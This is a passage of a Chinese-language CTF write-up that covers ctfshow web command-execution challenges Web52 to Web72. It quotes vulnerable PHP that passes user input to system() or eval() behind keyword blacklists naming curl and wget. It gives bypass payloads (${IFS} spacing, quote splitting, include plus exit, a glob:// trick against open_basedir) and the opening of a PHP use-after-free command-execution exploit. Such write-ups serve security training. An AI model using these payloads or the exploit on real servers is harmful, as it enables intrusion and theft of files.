punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>这次把尖括号去了，这下空格没法过滤了，？？？不对，他把美元符给我放出来了…那就$IFS</p>\n<pre><code class=\"prism language-php\"><span class=\"token class-name type-declaration\">nl</span><span class=\"token variable\">$</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">}</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span>\n</code></pre>\n<p>结果发现常规方法不对？？？</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\f9c86581057b4c2cafbd380def691b10.png\"/></p>\n<p>好家伙，他这flag不保熟，看看根目录吧</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\99e45f9c3f764443ba92d360c285e402.png\"/></p>\n<p>访问这个flag试试</p>\n<pre><code class=\"prism language-php\"><span class=\"token class-name type-declaration\">cp</span><span class=\"token variable\">$</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">}</span><span class=\"token operator\">/</span>fl<span class=\"token string single-quoted-string\">''</span><span class=\"token class-name type-declaration\">ag</span><span class=\"token variable\">$</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">}</span><span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html<span class=\"token operator\">/</span>a<span class=\"token operator\">.</span><span class=\"token class-name\">txt</span><span class=\"token operator\">||</span>\n</code></pre>\n<p>因为我尝试直接访问那个flag但是我查不到flag，所以就直接把内容copy到这个目录下保存为a.txt，传完ls看一下存进去没有，存进去之后直接访问a.txt就拿到真的flag了</p>\n<h2><a id=\"Web53_690\"></a>Web53</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$d</span> <span class=\"token operator\">=</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'no'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>看一下代码，发现<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        d\n       \n       \n        =\n       \n       \n        s\n       \n       \n        y\n       \n       \n        s\n       \n       \n        t\n       \n       \n        e\n       \n       \n        m\n       \n       \n        (\n       \n      \n      \n       d = system(\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">d</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">m</span><span class=\"mopen\">(</span></span></span></span></span>c);也就是说直接把我们传进去c的值放进system之中，用?c='ls’验证猜想，确实可以</p>\n<p>那就可以直接传nl${IFS}fl’'ag.php就可以了</p>\n<h2><a id=\"Web54_716\"></a>Web54</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n</code></pre>\n<p>这下敌方也开始用通配符了，走我们的路让我们无路可走</p>\n<p>但是在仔细看就发现，它实际上是防止截断，那我们就不用这几个函数了，类似上一题，我们直接修改flag.php的文件名称即可</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">mv</span><span class=\"token variable\">$</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">}</span>fla<span class=\"token operator\">?</span><span class=\"token operator\">.</span><span class=\"token class-name type-declaration\">php</span><span class=\"token variable\">$</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">}</span>a<span class=\"token operator\">.</span>txt\n</code></pre>\n<p>还是直接访问a.txt</p>\n<h2><a id=\"Web55_744\"></a>Web55</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token comment\">// 你们在炫技吗？</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>我太菜了算上56，57都还不会，等我整明白了再补上吧</p>\n<h2><a id=\"Web58_766\"></a>Web58</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token comment\">// 你们在炫技吗？</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>注意传参方式的改变，改为了POST传参</p>\n<p>由于没有过滤，我先用了system，出于安全考虑实际上system被过滤掉了，所以改用show_source或是highlight_file还有echo file_get_contents均可</p>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h2><a id=\"Web59_791\"></a>Web59</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token comment\">// 你们在炫技吗？</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>看着跟上一题一样，我试了一下，他应该是只过滤了echo file_get_contents</p>\n<p>highlight_file还能用</p>\n<h2><a id=\"Web60_812\"></a>Web60</h2>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token comment\">// 你们在炫技吗？</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>直接试了一下，过滤的不是highlight_file，好像show_source也行</p>\n<p>图个省事，后边几个一样的题我就空着了</p>\n<h2><a id=\"Web61_829\"></a>Web61</h2>\n<h2><a id=\"Web62_831\"></a>Web62</h2>\n<h2><a id=\"Web63_833\"></a>Web63</h2>\n<h2><a id=\"Web64_835\"></a>Web64</h2>\n<h2><a id=\"Web65_837\"></a>Web65</h2>\n<h2><a id=\"Web66_843\"></a>Web66</h2>\n<p>终于不一样了，</p>\n<p>show_source不能用了，但是highlight_file还能用，用完发现不太对</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\2a463e3718564fb395f2c8947c8d03ca.png\"/></p>\n<p>很显然位置不对，遍历一下目录看一下<code>c=print_r(scandir(\"/\"));</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\0bc1dafe959842df8f77650fcce9a0ff.png\"/></p>\n<p>发现了flag.txt文件，再试一次</p>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>出来了</p>\n<h2><a id=\"Web67_868\"></a>Web67</h2>\n<p>代码还是一样的就不放了</p>\n<p>我猜他还是放在了flag.txt里</p>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>果不其然，，，</p>\n<h2><a id=\"Web68_884\"></a>Web68</h2>\n<p>这highlight_file禁用的源码都看不了</p>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>防止大佬们又改名改目录，先遍历一下</p>\n<p>这次回显的话就只能用include和require了</p>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h2><a id=\"Web69_904\"></a>Web69</h2>\n<p>依然由于禁用highlight_file连源码都看不到</p>\n<p>完了，他也不让我用var_dump遍历了，，，</p>\n<p>我先图个省事，我赌他的枪里没子弹（还在原来的地方）</p>\n<p>嘿，果然没改地方</p>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h2><a id=\"Web70_922\"></a>Web70</h2>\n<p>error_reporting() 错误控制函数</p>\n<p>ini_set()函数</p>\n<p>还有highlight_file函数都被禁用了</p>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h2><a id=\"Web71_938\"></a>Web71</h2>\n<p>终于给源码了</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'display_errors'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 你们在炫技吗？</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">ob_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">ob_end_clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]|[a-z]/i\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"?\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n你要上天吗？\n</code></pre>\n<p>将post传的c给s缓冲区然后清除缓冲数据</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\04c5f3887f7040869d73d81e4e4ef042.png\"/></p>\n<p>可以通过exit提前结束，从而防止缓冲区数据被清除</p>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h2><a id=\"Web72_976\"></a>Web72</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'display_errors'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 你们在炫技吗？</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">ob_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">ob_end_clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]|[a-z]/i\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"?\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n你要上天吗？\n</code></pre>\n<p>源码是一样的，但是找不到flag的文件名和位置，所以必须想办遍历目录找flag位置</p>\n<p>存在一个open_basedir限制，这个限制就是限制可以访问的目录，<strong>glob是5.3.0版本起开始生效的一个用来筛选目录的伪协议，它在筛选目录时是不受open_basedir的制约的，所以我们可以利用它来绕过限制</strong></p>\n<pre><code class=\"prism language-php\">c<span class=\"token operator\">=</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name type-declaration\">php</span> <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glob:///*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>遍历获取flag位置，然后include读取时发现没有权限</p>\n<p>用uaf脚本命令执行poc,要url编码</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Vuln</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span> \n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span> \n            <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$backtrace</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token variable\">$backtrace</span> <span class=\"token operator\">=</span> <span class=\"token function\">debug_backtrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Helper</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$address</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$s</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token 